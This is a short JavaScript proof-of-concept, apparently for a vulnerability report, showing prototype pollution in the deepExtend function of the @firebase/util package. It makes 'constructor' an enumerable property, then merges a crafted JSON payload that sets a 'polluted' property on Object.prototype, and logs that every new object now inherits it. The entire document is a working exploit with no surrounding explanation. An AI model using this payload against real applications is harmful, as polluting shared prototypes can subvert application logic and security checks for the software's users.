var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const utils = require('@firebase/util');
const source = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
utils.deepExtend(obj, source);
console.log({}.polluted);